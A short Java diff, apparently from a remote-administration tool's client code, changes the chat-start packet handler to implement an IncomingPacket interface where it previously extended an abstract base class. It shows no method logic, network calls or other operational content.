@@ -3,7 +3,7 @@ package jrat.client.packets.incoming;
 import jrat.client.Connection;
 import jrat.client.FrameChat;
 
-public class Packet48ChatStart extends AbstractIncomingPacket {
+public class Packet48ChatStart implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
